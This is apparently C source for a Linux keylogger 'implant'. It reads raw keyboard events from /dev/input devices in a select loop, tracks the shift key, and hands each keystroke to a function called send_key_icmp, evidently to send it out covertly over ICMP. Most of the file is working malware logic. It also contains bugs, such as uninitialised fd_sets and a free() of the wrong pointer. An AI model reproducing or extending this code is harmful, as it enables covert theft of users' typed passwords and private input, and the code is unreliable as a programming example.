
#include <alloca.h>
#include <bits/types/struct_timeval.h>
#include <errno.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <sys/queue.h>
#include <sys/select.h>
#include <sys/types.h>
#include <unistd.h>
#include <xkbcommon/xkbcommon.h>
#include "implant.h"

static int
get_highest_fd(const implant_t *instance) {
    int highest_fd = -1;

    keyboard_t *it = NULL;
    TAILQ_FOREACH(it, &instance->kbd, devices) {
        highest_fd = (it->fd > highest_fd) ? it->fd : highest_fd;
    }
    return highest_fd;
}

static int
log_keyboard(const int fd, struct input_event *evt, implant_t *implant) {
    static bool shift_pressed = false;

    /*
        read events out of /dev/input/by-path/${**}-kbd

    TODO:
        for now, we only read one, but we can attempt to read them in
        bulk of 6-10 once bufferizing messages is implemented
    */

    ssize_t bytes_read = read(fd, evt, sizeof(struct input_event));
#ifdef DEBUG
    DEBUG_LOG("[!] read %ld bytes", bytes_read);
#endif

    if (bytes_read != sizeof(struct input_event)) {

#ifdef DEBUG
        DEBUG_LOG("[!] read() error: %s", strerror(errno));
#endif

        return ERROR;
    }

    /* checking is we are in MAJ key. TODO: check if CAPS_LOCK is enabled or not.
     */
    if (evt->type == EV_KEY && evt->value == KEY_RELEASED) {
        if (evt->code == KEY_LEFTSHIFT || evt->code == KEY_RIGHTSHIFT) {
            shift_pressed = false;
        }
    }

    if (evt->type == EV_KEY && evt->value == KEY_PRESSED) {
        if (evt->code == KEY_LEFTSHIFT || evt->code == KEY_RIGHTSHIFT) {
            shift_pressed = true;
        }
    }

    implant->using_caps_lock = (uint8_t)shift_pressed;
    return SUCCESSFUL;
}

/*
    main loop to listen for keys and stuff
*/
void keylog(implant_t *instance) {

    /* first set up select etc */
    int highest_fd = get_highest_fd(instance);
    fd_set rd, err;
    int status = 0;

    if (highest_fd < 0) {

#ifdef DEBUG
        DEBUG_LOG("[!] no keyboard found. exiting");
#endif

        return;
    }
    /* run the damn loop */
    while (0x520) {

        /* setup FD-sets */
        keyboard_t *it = NULL;
        TAILQ_FOREACH(it, &instance->kbd, devices) {
            FD_SET(it->fd, &rd);
            FD_SET(it->fd, &err);
        }

        /*
            check if a key has been pressed

            i really dont like this method because it means that everytime you
            press a key, a least 2 syscalls are ran (select & read)

            since we are buffering the keys anyway, why not poll for new events
            every n seconds & then call read() ? is there a risk of missing keys?
           tbd

            this select method works well for servers, but not really to poll new
           events
        */
#ifdef DEBUG
        struct timeval timeout = {0, 1};
        status = select(highest_fd + 1, &rd, NULL, &err, &timeout);
#else
        status = select(highest_fd + 1, &rd, NULL, &err, NULL);
#endif

        if (status < 0) {

#ifdef DEBUG
            DEBUG_LOG("[!] select error: %s", strerror(errno));
#endif

            goto LOG_FUNCTION_CLEANUP;
        }

        /* check file descriptors (first for error, then for new input) */
        it = NULL;
        TAILQ_FOREACH(it, &instance->kbd, devices) {
            if (FD_ISSET(it->fd, &err)) {

#ifdef DEBUG
                DEBUG_LOG("[!] Error on file descriptor %d", it->fd);
#endif

                /* keyboard has been un-plugged, let's continue */
                FD_CLR(it->fd, &rd);
                FD_CLR(it->fd, &err);

                close(it->fd);

                /* making sure we dont have a memory leak here */
                void *tmp_ptr = &instance->kbd;
                TAILQ_REMOVE(&instance->kbd, it, devices);

                free(tmp_ptr);
                continue;
            }

            /* checking for new input here */
            if (FD_ISSET(it->fd, &rd)) {

                struct input_event evt = {0};
                /*
                    should we really kill the run here or can we recover this ?
                    i need to run some tests before making a decision.
                */
                if (ERROR == log_keyboard(it->fd, &evt, instance)) {
                    goto LOG_FUNCTION_CLEANUP;
                }

                if (ERROR == send_key_icmp(instance, evt)) {
                    goto LOG_FUNCTION_CLEANUP;
                }
            }
        }
    }

LOG_FUNCTION_CLEANUP:

    /* closing file descriptors if instance still exists */
    if (instance != NULL) {
        keyboard_t *it = NULL;
        TAILQ_FOREACH(it, &instance->kbd, devices) {
            close(it->fd);
        }
    }
}
